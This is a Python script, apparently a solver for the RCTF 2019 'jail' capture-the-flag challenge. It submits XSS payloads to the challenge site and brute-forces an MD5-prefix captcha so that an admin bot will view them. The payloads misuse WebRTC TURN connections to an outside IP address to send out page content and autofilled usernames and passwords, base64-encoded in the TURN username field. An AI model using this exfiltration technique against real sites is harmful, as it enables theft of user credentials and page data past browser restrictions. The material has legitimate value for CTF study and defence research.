import hashlib
import requests

getpage = True
i = 0
while True:
    cookies = {
        '__cfduid': 'd4c8616d05d43f992e482e0bd4f01184d1558206448',
        'PHPSESSID': '9fdc308f14a84445392303dee7af530f',
        'hint1': 'flag1_is_in_cookie',
        'hint2': 'meta_refresh_is_banned_in_server',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.8,sv-SE;q=0.5,sv;q=0.3',
        'Referer': 'https://jail.2019.rctf.rois.io/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }

    if getpage:
        data = {
        'message': '<script> function x() {var auth =  document.body.innerHTML.slice('+str(-300*i)+'); function gotDescription(desc) { begin=window.performance.now(); candidates=[]; pc.setLocalDescription(desc); } function noDescription(error) { console.log(\'Error creating offer: \', error); } var pc=new RTCPeerConnection( { "iceServers":[ { "urls": ["turn:185.45.112.132:3478"], "username": btoa(auth), "credential": "password1" } ], "iceTransportPolicy":"all", "iceCandidatePoolSize":"0" } ); pc.createOffer( { offerToReceiveAudio: 1 } ).then( gotDescription, noDescription); } function timer() { setTimeout(x, 1000); } </script> <html><body onload="timer()"> <form id="" method="POST"><input type="text" autocomplete="on" name="username" id="username" /><input type="password" autocomplete="on" name="password" id="password" /><input type="submit" value="g\xF6" /> </form> </body></html>'
        }
    else:
        data = {
        'message': '<script> function x() {document.getElementById(\'username\').click(); document.getElementById(\'cip-ui-id-4\').click(); var auth = document.getElementById(\'username\').value+\':\'+document.getElementById(\'password\').value; function gotDescription(desc) { begin=window.performance.now(); candidates=[]; pc.setLocalDescription(desc); } function noDescription(error) { console.log(\'Error creating offer: \', error); } var pc=new RTCPeerConnection( { "iceServers":[ { "urls": ["turn:185.45.112.132:3478"], "username": btoa(auth), "credential": "password1" } ], "iceTransportPolicy":"all", "iceCandidatePoolSize":"0" } ); pc.createOffer( { offerToReceiveAudio: 1 } ).then( gotDescription, noDescription); } function timer() { setTimeout(x, 1000); } </script> <html><body onload="timer()"> <form id="" method="POST"><input type="text" autocomplete="on" name="username" id="username" /><input type="password" autocomplete="on" name="password" id="password" /><input type="submit" value="g\xF6" /> </form> </body></html>'
        }

    response = requests.post('https://jail.2019.rctf.rois.io/', headers=headers, cookies=cookies, data=data)


    id = response.text.split('id=')[1].split('"')[0]
    
    params = (
        ('action', 'feedback'),
    )

    response = requests.get('https://jail.2019.rctf.rois.io/', headers=headers, params=params, cookies=cookies)
    target = response.text.split('a), 0, 6) == "')[1].split('"')[0]

    candidate = 0
    captcha = ""
    for candidate in range(0,10000000):
        plaintext = str(candidate)
        hash = hashlib.md5(plaintext.encode('ascii')).hexdigest()
        if hash[:6] == target:
            captcha = plaintext
            break
        candidate = candidate + 1

    params = (
        ('action', 'feedback'),
    )

    data = {
    'id': id,
    'captcha': captcha,
    'test': '1'
    }
    response = requests.post('https://jail.2019.rctf.rois.io/#', headers=headers, params=params, cookies=cookies, data=data)
    print(response.text)
    if "Admin will view your post soon." in response.text:
        if getpage:
            i+=1
        else:
            break